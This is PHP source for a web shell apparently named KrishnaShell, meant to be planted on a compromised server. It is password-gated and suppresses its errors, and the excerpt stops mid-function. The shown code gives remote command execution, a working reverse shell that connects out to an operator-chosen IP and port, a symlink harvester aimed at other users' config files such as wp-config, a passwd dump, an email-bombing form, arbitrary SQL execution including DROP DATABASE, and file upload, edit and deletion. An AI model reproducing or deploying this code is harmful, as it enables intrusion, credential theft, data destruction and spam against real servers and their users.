<?php
ini_set('display_errors',0);
ini_set('display_startup_errors',0);
error_reporting(0);
session_start();
$k=2.2;
$kk1=array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
$kk2=array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork","stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid");
$kk3=array("system","shell_exec","exec","passthru","proc_open");
$kk4=strtolower(substr(PHP_OS,0,3));
$kk5=array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip","bombing");

class KrishnaShell{
    public $krishna;
    public $krishna1;
    public $krishna2='Krishna@Yadav#2099'; #tgchannel
    private $krishna3=0;
    private $krishna4="4797450924659018";
    private $krishna5="AES-256-CBC";
    private $krishna6;
    private $krishna7;
    private $krishna8=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
    private $krishna9=1024;
    private $krishna10=0;
    private $krishna11=false;
    static protected $krishna12="5d41402abc4b2a76b9719d911017c592";
    static protected $krishna13="";

    public function __construct(){}

    public function k1($n,$t,$m,$f,$x){
        if($x){$l="window.location.replace(window.location.href)";}else{$l="window.history.back()";}
        if(isset($GLOBALS['kk1'][0]['dfp'])&&isset($GLOBALS['kk1'][0]['dff'])){$sl="window.location.replace('?dfp=".$GLOBALS['kk1'][0]['dfp']."')";}else{$sl="window.location.replace('".$GLOBALS['kk1'][2]['PHP_SELF']."')";}
        switch($n){
            case 1:$s="<script>Swal.fire({icon:'info',title:'".$t."',text:'".$m."',footer:'".$f."'});setTimeout(function(){ ".$l." },1500);</script>";print($s);break;
            case 2:$s="<script>Swal.fire({icon:'error',title:'".$t."',text:'".$m."',footer:'".$f."'});setTimeout(function(){ ".$l." },1500);</script>";print($s);break;
            case 3:$s="<script>Swal.fire({position:'top-end',icon:'success',title:'".$m."',showConfirmButton:false,timer:2000});setTimeout(function(){ ".$l." },1500);</script>";print($s);break;
            case 4:$s="<script>Swal.fire({position:'top-end',icon:'error',title:'".$m."',showConfirmButton:false,timer:2000});setTimeout(function(){ ".$l." },1500);</script>";print($s);break;
            case 5:$s="<script>Swal.fire({position:'top-end',icon:'success',title:'".$m."',showConfirmButton:false,timer:2000});</script>";print($s);break;
        }
    }

    function __call($m,$a){if(isset($m)&&isset($a)){$a[0]($a[1]);}}

    private function k2(){print("Hare Krishna! Magic Happened!");}

    public function k3(){
        $this->krishna6=openssl_cipher_iv_length($this->krishna5);
        $this->krishna7=openssl_encrypt($this->krishna,$this->krishna5,sha1($this->krishna2),$this->krishna3,$this->krishna4);
        return $this->krishna7;
    }

    public function k4($e){
        $this->krishna7=openssl_decrypt($e,$this->krishna5,sha1($this->krishna2),$this->krishna3,$this->krishna4);
        return $this->krishna7;
    }

    public function k5($p){
        $lp=$this->k4(urldecode($p));
        if(md5($lp)===self::$krishna12){
            $_SESSION['krishna_auth']=sha1($GLOBALS['kk1'][2]['REMOTE_ADDR']);
            setrawcookie('krishna_ver',$GLOBALS['k'],(time()+18000),'/',$GLOBALS['kk1'][2]['HTTP_HOST'],1,1);
            return true;
        }else{
            echo "<script>alert('Wrong pass! Jai Shri Krishna!');window.location.replace('".$GLOBALS['kk1'][2]['PHP_SELF']."')</script>";
            return false;
        }
    }

    public function k6(){if($GLOBALS['kk4']!=='win'){return "/";}else{return "\\";}}

    public function k7($b){
        if($b>=1073741824){$b=number_format($b/1073741824,2).' GB';}
        elseif($b>=1048576){$b=number_format($b/1048576,2).' MB';}
        elseif($b>=1024){$b=number_format($b/1024,2).' KB';}
        elseif($b>1){$b=$b.' B';}
        else{$b='0 bytes';}
        return $b;
    }

    private function k8($i,$o,$in,$on){
        while(($d=$this->k9($i,$in,$this->krishna9))&&$this->k10($o,$on,$d)){
            if($GLOBALS['kk4']==='WINDOWS'&&$on==='STDIN'){$this->krishna10+=strlen($d);}
        }
    }

    private function k11($i,$o,$in,$on){
        $fs=fstat($i);$sz=$fs['size'];
        if($GLOBALS['kk4']==='lin'&&$in==='STDOUT'&&$this->krishna10){
            while($this->krishna10>0&&($b=$this->krishna10>=$this->krishna9?$this->krishna9:$this->krishna10)&&$this->k9($i,$in,$b)){$this->krishna10-=$b;$sz-=$b;}
        }
        while($sz>0&&($b=$sz>=$this->krishna9?$this->krishna9:$sz)&&($d=$this->k9($i,$in,$b))&&$this->k10($o,$on,$d)){$sz-=$b;}
    }

    private function k9($s,$n,$b){
        if(($d=@fread($s,$b))===false){$this->krishna11=true;echo"<br>STRM_ERROR: Cannot read from {$n}, script will now exit...<br>";}
        return $d;
    }

    private function k10($s,$n,$d){
        if(($b=@fwrite($s,$d))===false){$this->krishna11=true;echo"<br>STRM_ERROR: Cannot write to {$n}, script will now exit...<br>";}
        return $b;
    }

    public function k12($ip,$port){
        $exit=false;
        if($GLOBALS['kk4']!=='lin'){$e='cmd.exe';}else{$e='/bin/sh';}
        if(!$GLOBALS['kk2'][5]('pcntl_fork')){echo"DAEMONIZE: pcntl_fork() does not exists, moving on...";}
        else if(($pid=@$GLOBALS['kk2'][7]())<0){echo"DAEMONIZE: Cannot fork off the parent process, moving on...";}
        else if($pid>0){$exit=true;echo"DAEMONIZE: Child process forked off successfully, parent process will now exit...";}
        else if($GLOBALS['kk2'][12]()<0){echo"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...";}
        else{echo"DAEMONIZE: Completed successfully!";}
        if(!$exit){
            @set_time_limit(0);@umask(0);
            $s=@$GLOBALS['kk2'][6]($ip,$port,$errno,$errstr,30);
            if(!$s){echo"Erro Socket! -> {$errno}: {$errstr}";}
            else{
                $GLOBALS['kk2'][8]($s,false);
                $p=@$GLOBALS['kk2'][10]($e,$this->krishna8,$pipes,null,null);
                if(!$p){echo"PROC_ERROR: Cannot start the shell";}
                else{
                    foreach($pipes as $pipe){$GLOBALS['kk2'][8]($pipe,false);}
                    $st=$GLOBALS['kk2'][9]($p);
                    @fwrite($s,"SOCKET: Shell has connected! PID: {$st['pid']}\n");
                    do{
                        $st=$GLOBALS['kk2'][9]($p);
                        if(feof($s)){echo"SOC_ERROR: Shell connection has been terminated\n";break;}
                        else if(feof($pipes[1])||!$st['running']){echo"PROC_ERROR: Shell process has been terminated";break;}
                        $streams=array('read'=>array($s,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);
                        $ncs=@$GLOBALS['kk2'][13]($streams['read'],$streams['write'],$streams['except'],0);
                        if($ncs===false){echo"STRM_ERROR: stream_select() failed\n";break;}
                        else if($ncs>0){
                            if($GLOBALS['kk4']==='lin'){
                                if(in_array($s,$streams['read'])){$this->k8($s,$pipes[0],'SOCKET','STDIN');}
                                if(in_array($pipes[2],$streams['read'])){$this->k8($pipes[2],$s,'STDERR','SOCKET');}
                                if(in_array($pipes[1],$streams['read'])){$this->k8($pipes[1],$s,'STDOUT','SOCKET');}
                            }else if($GLOBALS['kk4']==='win'){
                                if(in_array($s,$streams['read'])){$this->k8($s,$pipes[0],'SOCKET','STDIN');}
                                if(($fs=fstat($pipes[2]))&&$fs['size']){$this->k11($pipes[2],$s,'STDERR','SOCKET');}
                                if(($fs=fstat($pipes[1]))&&$fs['size']){$this->k11($pipes[1],$s,'STDOUT','SOCKET');}
                            }
                        }
                    }while(!$this->krishna11);
                    foreach($pipes as $pipe){fclose($pipe);}
                    $GLOBALS['kk2'][11]($p);
                }
                fclose($s);
            }
        }
    }

    public function k13($a){
        switch(strtolower($a)){
            case"download":
                $s=$this->k6();
                $pf=$this->k4(($this->krishna1[0])).$this->k4(($this->krishna1[1]));
                $pf=$this->k4($this->k14($pf));
                if(file_exists($pf)){
                    $t=mime_content_type($pf)?:'text/plain';
                    header("Content-Type: ".$t);
                    header('Content-Description: File Transfer');
                    header("Content-Length: ".filesize($pf));
                    header('Content-Disposition: attachment; filename="'.basename($pf).'"');
                    $GLOBALS['kk2'][2]($pf);
                }else{echo"<script>alert('File not found!');</script>";}
            break;
            case"chmd":
                $s=$this->k6();
                $this->k15($s);
                if(isset($this->krishna1)){
                    $dm=$this->k4($this->krishna1[0]);
                    $fm="";
                    if(isset($this->krishna1[1])){$fm=$this->k4($this->krishna1[1]);}
                    $_cm=$this->k16(fileperms($dm.$fm));
                    echo"<div class='modarea'><p><span class='gold'>📍 Location : </span><span class='orange'>$dm$fm</span></p>";
                    echo"<form action='' method='POST' autocomplete='OFF'><input type='text' name='modf' placeholder='$_cm'><input type='submit' name='cmod' value='Chmod'></form></div>";
                    if(isset($GLOBALS['kk1'][1]['cmod'])){
                        if($this->k17($dm.$fm,$GLOBALS['kk1'][1]['modf'])){echo"<script>alert('Successfully changed!');</script>";}
                        else{echo"<script>alert('An error occured!');</script>";}
                    }
                }
            break;
            case"bombing":
                echo"<div class='bombing'><h3>📧 Email Bombing</h3><form action='' method='POST'><div class='form-row'><input type='text' name='mail_subject' placeholder='Subject'></div><div class='form-row'><textarea name='mail_list' placeholder='email@list.com'></textarea><textarea name='mail_text' placeholder='Message Text'></textarea></div><div class='form-row'><button>SEND MAIL</button></div></form>";
                if(isset($GLOBALS['kk1'][1]['mail_list'])&&isset($GLOBALS['kk1'][1]['mail_text'])){
                    $emails=explode("\n",$GLOBALS['kk1'][1]['mail_list']);
                    $message=$GLOBALS['kk1'][1]['mail_text'];
                    $subject=$GLOBALS['kk1'][1]['mail_subject'];
                    $headers="From: ".$GLOBALS['kk1'][2]['SERVER_ADMIN'];
                    foreach($emails as $email){
                        $email=preg_replace("/\s+/i","",$email);
                        if(@mail($email,$subject,$message,$headers)){print("<span class='green'>✅ Email sent -> ".$email."</span><br>");}
                        else{print("<span class='red'>❌ Failed -> ".$email."</span><br>");}
                    }
                }
                echo"</div>";
            break;
            case"massdel":
                $s=$this->k6();
                if(isset($GLOBALS['kk1'][1]['selectAction'])){
                    if($GLOBALS['kk1'][1]['selectAction']==="Delete")
                    if(!empty($GLOBALS['kk1'][1]['toZip'])){
                        if(isset($GLOBALS['kk1'][0]['dfp'])){$dp=$this->k4($GLOBALS['kk1'][0]['dfp']).$s;}else{$dp="";}
                        $td=$GLOBALS['kk1'][1]['toZip'];
                        for($i=0;$i<count($td);$i++){
                            $md=explode("||",$td[$i]);
                            $md_dir=$this->k4(urldecode($md[0]));
                            $md_item=$this->k4(urldecode($md[1]));
                            if(file_exists($md_dir.$md_item)){
                                if(is_dir($md_dir.$md_item)){@rmdir($md_dir.$md_item);}
                                if(is_file($md_dir.$md_item)){@unlink($md_dir.$md_item);}
                            }
                        }
                        $this->k1(3,null,"Selected file deleted!",null,true);
                    }else{$this->k1(4,null,"No file deleted!",null,true);}
                }
            break;
            case"zipping":
                $zr=new ZipArchive;
                $s=$this->k6();
                if(isset($GLOBALS['kk1'][1]['selectAction'])){
                    if($GLOBALS['kk1'][1]['selectAction']==="Zip")
                    if(empty($GLOBALS['kk1'][1]['toZip'])){print("<script>alert('You have to pick a file');</script>");}
                    else{
                        $tz=$GLOBALS['kk1'][1]['toZip'];
                        $zxn=md5(time()).".zip";
                        if(isset($GLOBALS['kk1'][0]['dfp'])){$zd=$this->k4($GLOBALS['kk1'][0]['dfp']).$s.$zxn;}else{$zd=$zxn;}
                        if($zr->open($zd,ZipArchive::CREATE|ZipArchive::OVERWRITE)){
                            for($i=0;$i<count($tz);$i++){
                                $mz=explode("||",$tz[$i]);
                                if(($mz[1])==="[novalue]"){
                                    $dzt=$this->k4(urldecode($mz[0])).$s;
                                    $rd=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dzt),RecursiveIteratorIterator::LEAVES_ONLY);
                                    foreach($rd as $name=>$file){
                                        if(!$file->isDir()){
                                            $fp=$file->getRealPath();
                                            $rp=substr($fp,strlen($dzt));
                                            $zr->addFile($fp,$rp);
                                        }
                                    }
                                }else{
                                    $fzt=$this->k4(urldecode($mz[0])).$s.$this->k4(urldecode($mz[1]));
                                    $zr->addFile($fzt,$this->k4(urldecode($mz[1])));
                                }
                            }
                            echo"<script>alert('saved as $zxn');window.location.replace(window.location.href);</script>";
                            $zr->close();
                        }
                    }
                }
            break;
            case"upload":
                $s=$this->k6();
                if(!isset($this->krishna1[0])){$p=getcwd().$s;}else{$p=$this->k4(($this->krishna1[0]))?:getcwd().$s;}
                $p=$this->k4($this->k14($p)).$s;
                if(isset($GLOBALS['kk1'][1]['dfupload'])){
                    if(move_uploaded_file($GLOBALS['kk1'][4]['dffile']['tmp_name'],$p.$GLOBALS['kk1'][4]['dffile']['name'])){$this->k1(3,null,"File uploaded!",null,true);}
                    else{$this->k1(4,null,"Permission denied!",null,true);}
                }
            break;
            case"dest":
                $s=$this->k6();
                if(!isset($GLOBALS['kk1'][1]['destroy'])){
                    echo"<div class='destroyer'><form action='' method='POST'><input type='submit' name='destroy' value='🔱 Remove this shell'/></form></div>";
                }else{
                    $krs_shell=$GLOBALS['kk1'][2]['DOCUMENT_ROOT'].$s.$GLOBALS['kk1'][2]['PHP_SELF'];
                    if(unlink($krs_shell)){$this->k1(3,null,"Shell destroyed!! Har Har Mahadev!",null,false);}
                    else{$this->k1(4,null,"Unable to destroy!!",null,true);}
                }
            break;
            case"edit":
                $s=$this->k6();
                $this->k15($s);
                $pf=$this->k4(($this->krishna1[0])).$this->k4(($this->krishna1[1]));
                $pf=$this->k4($this->k14($pf));
                if(!isset($GLOBALS['kk1'][1]['dfedit'])){
                    echo"<div class='editform'><form action='' method='POST'><textarea class='editcontent' name='editx'>".htmlspecialchars($GLOBALS['kk2'][0]($pf))."</textarea><input type='submit' name='dfedit' value='💾 Save'></form></div>";
                }else{
                    $pto=fopen($pf,'w');fwrite($pto,$GLOBALS['kk1'][1]['editx']);fclose($pto);
                    $this->k1(3,null,"Saved! Jai Shri Krishna!",null,true);
                }
            break;
            case"view":
                $s=$this->k6();
                $this->k15($s);
                $pf=$this->k4(($this->krishna1[0])).$this->k4(($this->krishna1[1]));
                $pf=$this->k4($this->k14($pf));
                echo"<div class='view-header'><span class='gold'>📁 Filename : </span><span class='teal'>".$this->k4(($this->krishna1[1]))."</span></div>";
                echo"<div class='sources'>";show_source($pf);echo"</div><div class='edit-btn'><a href='?dfp=".urlencode($this->krishna1[0])."&dff=".urlencode($this->krishna1[1])."&dfaction=edit'><button>✏️ Edit</button></a></div>";
            break;
            case"mkfile":
                $s=$this->k6();
                if(isset($GLOBALS['kk1'][1]['createfile'])){
                    $fname=$GLOBALS['kk1'][1]['newfile']?:'newfile.txt';
                    $fc=fopen($this->k4(($this->krishna1[0])).$s.$fname,'w');fwrite($fc,"");fclose($fc);
                    $this->k1(3,null,"File created!",null,true);
                }
            break;
            case"mkdir":
                $s=$this->k6();
                if(isset($GLOBALS['kk1'][1]['createfolder'])){
                    $fname=$GLOBALS['kk1'][1]['newfolder']?:'newfolder';
                    if(!file_exists($fname)){
                        if(mkdir($this->k4(($this->krishna1[0])).$s.$fname)){$this->k1(3,null,"Folder created!",null,true);}
                        else{$this->k1(4,null,"Permission denied!",null,true);}
                    }else{$this->k1(4,null,"Folder existed!",null,true);}
                }
            break;
            case"cmd":
                $s=$this->k6();
                $this->k15($s);
                echo"<div class='cmd-area'><form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                if(isset($GLOBALS['kk1'][1]['dfscmd'])&&!empty($GLOBALS['kk1'][1]['dfscmd'])){$this->k18($GLOBALS['kk1'][1]['dfscmd']);}
                echo"</textarea><br><input type='text' name='dfscmd' placeholder='whoami'><br><button>🚀 Execute</button></form></div>";
            break;
            case"sym":
                echo"<div class='symlinkarea'><div class='symex'><label>🔗 Example : /home/%{user}%/public_html/target_file.php || /var/www/%{user}%/html/file.php</label></div><form action='' method='POST'><input type='hidden' name='dfssym'><div class='form-row'><label class='sym-label'>Symlink target :</label><input type='text' name='target' placeholder='/path/%{user}%/path/file.php'></div><div class='form-row'><label class='sym-label'>Save path :</label><input type='text' name='path' placeholder='path/'></div><div class='form-row'><label class='sym-label'>Save as :</label><input type='text' name='dfsaved' placeholder='wp-config.txt'></div><div class='form-row'><button>🔗 Symlink</button></div></form><div class='sym_response'>";
                if(isset($GLOBALS['kk1'][1]['dfssym'])){
                    if($GLOBALS['kk4']!=='win'){
                        if(!file_exists('sym')){mkdir($GLOBALS['kk1'][1]['path'].'/sym');}
                        $c="";
                        for($uid=0;$uid<4000;$uid++){
                            $n=posix_getpwuid($uid);
                            if(!empty($n)){
                                if(!file_exists($GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'])){
                                    mkdir($GLOBALS['kk1'][1]['path'].'/sym/'.$n['name']);
                                    $tp=$this->k19('/%{user}%/i',$n['name'],base64_decode(urldecode($GLOBALS['kk1'][1]['target'])));
                                    if(isset($tp)){
                                        $this->k18("ln -s ".$tp.' '.$GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/'.$GLOBALS['kk1'][1]['dfsaved']);
                                        symlink($tp,$GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/'.$GLOBALS['kk1'][1]['dfsaved']);
                                        $uh=fopen($GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/.htaccess','w');
                                        fwrite($uh,$this->k19('/%{user}%/i',$GLOBALS['kk1'][1]['dfsaved'],$c));
                                        fclose($uh);
                                        $dfsv=urlencode($GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/'.$GLOBALS['kk1'][1]['dfsaved']);
                                        print("<span class='green'>✅ Done! -> ".$n['name']." -> <a href='".urldecode($dfsv)."'>Open</a></span><br>");
                                    }
                                }else{
                                    $tp=$this->k19('/%{user}%/i',$n['name'],base64_decode(urldecode($GLOBALS['kk1'][1]['target'])));
                                    if(isset($tp)){
                                        $this->k18("ln -s ".$tp.' '.$GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/'.$GLOBALS['kk1'][1]['dfsaved']);
                                        symlink($tp,$GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/'.$GLOBALS['kk1'][1]['dfsaved']);
                                        $uh=fopen($GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/.htaccess','w');
                                        fwrite($uh,$this->k19('/%{user}%/i',$GLOBALS['kk1'][1]['dfsaved'],$c));
                                        fclose($uh);
                                        $dfsv=urlencode($GLOBALS['kk1'][1]['path'].'/sym/'.$n['name'].'/'.$GLOBALS['kk1'][1]['dfsaved']);
                                        print("<span class='green'>✅ Done! -> ".$n['name']." -> <a href='".urldecode($dfsv)."'>Open</a></span><br>");
                                    }
                                }
                            }
                        }
                    }else{echo"<div class='center red'>❌ Not work in window!</div>";}
                }
                echo"</div></div>";
            break;
            case"reverse":
                $rh='<div class="reverse-form"><h3>🔄 Reverse Shell Connection</h3><form action="" method="POST"><input type="hidden" name="dfsrev"><input type="text" name="dfsaddr" placeholder="IP Address" required><input type="text" name="dfsport" placeholder="Port" required><button type="submit">Connect</button></form></div>';
                echo"<div class='reverse'>";
                if(!isset($GLOBALS['kk1'][1]['dfsrev'])){echo$rh;}
                else{echo$rh;echo"<code class='reverse-output'>";$addr=trim($GLOBALS['kk1'][1]['dfsaddr']);$port=trim($GLOBALS['kk1'][1]['dfsport']);$this->k12($addr,$port);echo"</code>";}
                echo"</div>";
            break;
            case"conf":
                echo"<div class='configs'><h3>📋 System Configuration</h3>";
                $pwid=array();
                if($GLOBALS['kk4']!=='win'){
                    for($uid=0;$uid<4000;$uid++){
                        $n=posix_getpwuid($uid);
                        if(!empty($n)){array_push($pwid,$n['name'].':'.$n['passwd'].':'.$n['uid'].':'.$n['gid'].':'.$n['dir'].':'.$n['shell']);}
                    }
                    foreach($pwid as $c){print($c."<br>");}
                }else{echo"<div class='center red'>❌ Not work in window!</div>";}
                echo"</div>";
            break;
            case"unzip":
                $from=$this->k4($GLOBALS['kk1'][0]['dfp']);
                $zipp=$this->k4($GLOBALS['kk1'][0]['dff']);
                echo"<div class='unzip-area'>";
                if(isset($GLOBALS['kk1'][1]['destination'])){
                    $zr=new ZipArchive;
                    $pth=$from.$zipp;
                    if($zr->open($pth)===TRUE){
                        $zr->extractTo($GLOBALS['kk1'][1]['destination']);
                        $zr->close();
                        $this->k1(3,null,"File successfully extracted to destination!",null,false);
                    }else{$this->k1(4,null,"Failed to extract into destination!",null,false);}
                }else{
                    echo"<div class='center'><span class='gold'>📦 Filename : ".$from.$zipp."</span>";
                    echo"<form action='' method='POST'><div class='form-row'><label>Destination : </label><input type='text' name='destination'></div><div class='form-row'><button>📂 Unzip</button></div>";
                    echo"</form></div>";
                }
                echo"</div>";
            break;
            case"scand":
                $s=$this->k6();
                $path=$this->k4(($this->krishna1[0])).$s;
                $path=$this->k4($this->k14($path));
                $this->k15($s);
                echo"<div class='directory'><form action='' method='POST'><div class='table-responsive'><div class='table-wrapper'><div class='krishna-table'><div class='table-header'><div class='th'>✓</div><div class='th'>Type</div><div class='th'>Name</div><div class='th'>Size</div><div class='th'>Owner</div><div class='th'>Perms</div><div class='th'>Modified</div><div class='th'>Action</div></div>";
                $folder=array_diff(scandir($path),['.','..']);
                $files=scandir($path);
                foreach($folder as $p){
                    if(is_dir($path.$s.$p)){
                        $f=$this->k4($this->k14($path));
                        $this->krishna=$f.$p;
                        echo"<div class='table-row'><div class='td'><input type='checkbox' name='toZip[]' value='".urlencode($this->k3())."||[novalue]'></div>";
                        echo"<div class='td'><i class='fa-regular fa-folder'></i></div><div class='td'><a href='?dfp=".urlencode($this->k3())."'>$p</a></div>";
                        echo"<div class='td'>-</div>";
                        echo"<div class='td'>".$this->k20($f.$s.$p)."</div>";
                        echo"<div class='td'><a href='?dfp=".urlencode($this->k3())."&dfaction=chmd'>".$this->k21($f.$s.$p)."</a></div>";
                        echo"<div class='td'>".date("h:i:sA d/m/Y",filemtime($f.$s.$p))."</div>";
                        echo"<div class='td'><a href='?dfp=".urlencode($this->k3())."&dfaction=ren'><i class='fa-solid fa-pen'></i></a> <a href='?dfp=".urlencode($this->k3())."&dfaction=del'><i class='fa-solid fa-trash'></i></a></div></div>";
                    }
                }
                foreach($files as $p){
                    if(is_file($path.$s.$p)){
                        $f=$this->k4($this->k14($path));
                        $this->krishna=$f;
                        $dfp=$this->k3();
                        $this->krishna=$p;
                        $dff=$this->k3();
                        $compressed=array("zip","tar","gz","rar");
                        $isz=pathinfo($p,PATHINFO_EXTENSION);
                        if(in_array($isz,$compressed)){
                            $tname=$p."<button class='unzip-small'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=unzip'>📦</a></button>";
                        }else{$tname=$p;}
                        echo"<div class='table-row'><div class='td'><input type='checkbox' name='toZip[]' value='".urlencode($dfp)."||".urlencode($dff)."'></div>";
                        echo"<div class='td'><i class='fa-solid fa-file'></i></div><div class='td'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."'>$tname</a></div>";
                        echo"<div class='td'>".$this->k7(filesize($f.$p))."</div>";
                        echo"<div class='td'>".$this->k20($f.$p)."</div>";
                        echo"<div class='td'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=chmd'>".$this->k21($f.$p)."</a></div>";
                        echo"<div class='td'>".date("h:i:sA d/m/Y",filemtime($f.$p))."</div>";
                        echo"<div class='td'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=edit'><i class='fa-solid fa-file-signature'></i></a> <a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=ren'><i class='fa-solid fa-pen'></i></a> <a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=del'><i class='fa-solid fa-trash'></i></a> <a href='?dfp=".urlencode($dfp)."&dfd=".urlencode($dff)."&dfaction=download'><i class='fa-solid fa-download'></i></a></div></div>";
                    }
                }
                echo"</div></div></div><div class='action-bar'><select name='selectAction'><option value=''>-- Action --</option><option value='Zip'>📦 Zip</option><option value='Delete'>🗑️ Delete</option></select><input type='submit' value='Submit'></div></form></div>";
            break;
            case"del":
                $s=$this->k6();
                $pf=$this->k4(($this->krishna1[0])).$this->k4(($this->krishna1[1]?:''));
                $pf=$this->k4($this->k14($pf));
                if(is_file($pf)){
                    if(unlink($pf)){$this->k1(3,null,"File Successfully deleted!",null,false);}
                    else{$this->k1(4,null,"Permission denied!",null,false);}
                }else if(is_dir($pf)){
                    if(rmdir($pf)){$this->k1(3,null,"Directory Successfully deleted!",null,false);}
                    else{$this->k1(4,null,"Permission denied!",null,false);}
                }
            break;
            case"ren":
                $s=$this->k6();
                $pf=$this->k4(($this->krishna1[0])).$this->k4(($this->krishna1[1]));
                $pf=$this->k4($this->k14($pf));
                if(getcwd()==$pf){$GLOBALS['kk2'][3]($GLOBALS['kk1'][2]['DOCUMENT_ROOT']);}
                echo"<div class='rename-area'>";
                if(isset($GLOBALS['kk1'][1]['newfile'])){
                    if(file_exists($pf)){
                        $krn=preg_replace("/".basename($pf)."/i",$GLOBALS['kk1'][1]['newfile'],$pf);
                        if(rename($pf,$krn)){$this->k1(5,"","File successfully renamed!","",true);echo"<script>setTimeout(function(){ window.location.replace('?dfp=".urlencode($GLOBALS['kk1'][1]['reflink'])."') },1500);</script>";}
                        else{$this->k1(4,null,"Permission denied!",null,true);}
                    }else{$this->k1(4,null,"No such file/directory!",null,true);}
                }else{
                    $krn=preg_replace("/".basename($pf)."/i","",$pf);
                    $this->krishna=$krn;
                    echo"<form action='' method='POST'><input type='hidden' name='reflink' value='".$this->k3()."'><div class='form-row'><label>📁 Full path : </label><span class='teal'>".$pf."</span></div><div class='form-row'><label>✏️ New name : </label><input type='text' name='newfile' placeholder='".basename($pf)."'></div><div class='form-row'><input type='submit' value='Rename'></div></form>";
                }
                echo"</div>";
            break;
            case"sql":
                echo"<div class='databases'>";
                if(isset($_SESSION['sql_auth'])){
                    $sqldat=explode('|--|',$_SESSION['sql_auth']);
                    $conn=mysqli_connect($sqldat[0],$sqldat[1],$sqldat[2]);
                    if(isset($GLOBALS['kk1'][1]['other'])){$this->k1(1,"Get Adminer","Please get adminer from link below","<a href='https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php'>Adminer</a>",true);}
                    else if(isset($GLOBALS['kk1'][1]['sqldrop'])){
                        $ftar=array("'",'"');
                        if(!isset($GLOBALS['kk1'][0]['tbname'])){
                            mysqli_select_db($conn,$GLOBALS['kk1'][0]['dbname']);
                            $dropping=str_replace($ftar,"",$GLOBALS['kk1'][0]['dbname']);
                            $dropsql="DROP DATABASE $dropping";
                            $query=mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->k1(3,null,"Database DROPPED!",null,false);
                        }else{
                            mysqli_select_db($conn,$GLOBALS['kk1'][0]['dbname']);
                            $dropping=str_replace($ftar,"",$GLOBALS['kk1'][0]['tbname']);
                            $dropsql="DROP TABLE $dropping";
                            $query=mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->k1(3,null,"Table DROPPED!",null,false);
                        }
                    }else if(isset($GLOBALS['kk1'][1]['sqlcommands'])){
                        if(isset($GLOBALS['kk1'][0]['dbname'])){mysqli_select_db($conn,$GLOBALS['kk1'][0]['dbname']);$inject=$GLOBALS['kk1'][1]['sqlcommands'];$query=mysqli_query($conn,$inject) or exit(mysqli_error($conn));$this->k1(3,null,"Command executed!",null,false);}
                        else{$inject=$GLOBALS['kk1'][1]['sqlcommands'];$query=mysqli_query($conn,$inject) or exit(mysqli_error($conn));$this->k1(3,null,"Command executed!",null,false);}
                    }else{
                        echo"<div class='sql-side'><form action='' method='POST'><input type='submit' value='Logout' name='sqllogout'></form><form action='' method='POST'><input type='submit' name='other' value='Get Adminer'></form>";
                        if(isset($GLOBALS['kk1'][0]['tbname'])||isset($GLOBALS['kk1'][0]['dbname'])){echo"<form action='' method='POST'><input class='red-btn' type='submit' name='sqldrop' value='DROP'></form>";}
                        echo"</div><form action='' method='POST'><textarea name='sqlcommands' placeholder='Theres no output, just use for edit value in database'></textarea><input type='submit' value='Execute'></form>";
                        echo"<div class='sql-field'><label class='gold'>🔄 Connected to mysql</label><br>";
                        if(!isset($GLOBALS['kk1'][0]['dbname'])){echo"<button><a href='?dfaction=sql'>🔙 Back</a></button><br>";}
                        else{if(!isset($GLOBALS['kk1'][0]['tbname'])){echo"<button><a href='?dfaction=sql'>🔙 Back</a></button><br>";}else{echo"<button><a href='?dfaction=sql&dbname=".$GLOBALS['kk1'][0]['dbname']."'>🔙 Back</a></button><br>";}}
                        if(isset($GLOBALS['kk1'][0]['dbname'])){
                            $dbs=mysqli_real_escape_string($conn,$GLOBALS['kk1'][0]['dbname']);
                            $sql="select table_name from information_schema.tables where table_schema='$dbs';";
                            $query=mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch=mysqli_fetch_assoc($query)){echo"<a href='?dfaction=sql&dbname=".$dbs."&tbname=".$fetch['table_name']."'>".$fetch['table_name']."</a><br>";}
                            echo"</div><div class='sql-col'>";
                            if(isset($GLOBALS['kk1'][0]['tbname'])){
                                if(!isset($GLOBALS['kk1'][0]['limit'])){
                                    mysqli_select_db($conn,$dbs);
                                    $tbl=mysqli_real_escape_string($conn,$GLOBALS['kk1'][0]['tbname']);
                                    $sql="select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1="select * from $tbl limit 20";
                                    $query=mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1=mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo"<div class='sql-table'><div class='sql-header'>";
                                    while($fetch=mysqli_fetch_assoc($query)){echo"<div class='sql-th'>".$fetch['column_name']."</div>";}
                                    echo"</div>";
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo"<div class='sql-row'>";
